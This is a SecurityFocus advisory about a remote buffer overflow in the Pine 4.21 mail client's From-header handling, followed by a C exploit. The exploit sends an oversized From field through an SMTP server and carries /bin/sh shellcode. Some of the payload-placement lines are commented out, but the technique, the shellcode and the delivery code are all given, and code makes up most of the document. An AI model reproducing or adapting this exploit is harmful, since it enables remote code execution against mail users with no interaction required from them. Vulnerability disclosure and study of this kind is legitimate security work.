source: http://www.securityfocus.com/bid/1709/info

A buffer overflow vulnerability exists in the popular mail client Pine 4.21 (and possibly earlier versions), relating to the function which regularly checks for incoming email. In standard e-mail message headers is a field that holds the name and address of the sender. It typically looks like and is presented in pine like this:

From: username <user@host>

Pine does not check the length of the username value when copying it into a memory buffer of predefined length. As a result, if a large "from" value is sent in the email header, it can corrupt "internal" memory when the offending function is called and the oversized buffer is copied onto the stack. An attacker can overwrite the return address of the function on the stack with a value that points back into the buffer, to which the function would return. Arbitrary machine instructions placed on the stack would then be executed.

The real concern here is that this requires no user interaction to exploit.. a target need only be using a vulnerable version of pine. The overflow occurs when the user recieves new email. While typically not yielding root privileges (unless root reads email with pine AS root) this can be used by a remote, anonymous attacker to gain local access to the target host. 

                Arkane [bTm]

 ######### ### # ##  # # ## # # ## # # # #       #  #  #   ###   ## ##  */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>

unsigned long get_sp (void)
{
__asm__ ("mov %esp, %eax");
}

#define ADDRLEN 700 
#define EXECLEN 1000
#define NOP    0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main (int argc, char **argv)
{
  struct sockaddr_in server;
  struct hostent *hp;
  int s;
  char helo[100];
  char mail[100];
  char rcpt[100];
  char data[2500];
  char start[20];

  int offset = 0;
  unsigned long addr;
  int i;
  char *addrs,*exec;

  addrs = (char *) malloc (ADDRLEN);
  exec  = (char *) malloc (EXECLEN);

if(argc < 2)
    {
     printf("   Usage: %s <Email Address> <offset>\n", argv[0]);
     printf("                                            \n\n");
     exit(0);
    }

     if (argc == 3)
       offset = atoi (argv[2]);

   //addr = get_sp () - offset; 

   addr = 0xbfffe7e2; //RH62

   memset(addrs,0x41,ADDRLEN);

  //  for (i = 0; i < ADDRLEN ; i += 4)
    //   *(unsigned *) &addrs[i] = addr;

 //  memset(exec,0x90,EXECLEN); 

 //  memset(addrs+195,0x90,5);

 //  memcpy (addrs + 200, shellcode, strlen (shellcode));

if((hp = gethostbyname ("mail.speakeasy.org")) == NULL) {
      printf ("Could not resolve mail.speakeasy.org.\n");
      exit(1); }

if((s = socket (AF_INET, SOCK_STREAM, 0)) == -1) {
      printf("Error");
      exit(1); }
 
  server.sin_family = AF_INET;
  server.sin_port = htons (25);
  server.sin_addr.s_addr = *(u_long *) hp->h_addr;
  bzero (&(server.sin_zero), 8);
 
if(connect(s, (struct sockaddr *) &server, sizeof (struct sockaddr)) == -1) {
      printf ("Connection refused\n");
      exit(1); }

        sprintf (helo, "helo test\r\n");
        sprintf (mail, "mail from: %s\r\n",argv[1]);

        send (s, helo, strlen (helo), 0);
        send (s, mail, strlen (mail), 0);

        sprintf (rcpt, "rcpt to: %s\r\n",argv[1]);

        send (s, rcpt, strlen (rcpt), 0);

        sprintf(start,"data\r\n");

        send (s, start, strlen (start), 0);

         fprintf(stderr," Message Sent! \n");

sprintf(data,"From: %s AAAAAAAA test@test.net\r\n%s\r\n.\r\nquit\r\n",addrs,exec);
        send (s, data, strlen (data), 0);



  close (s);
  exit(0);
}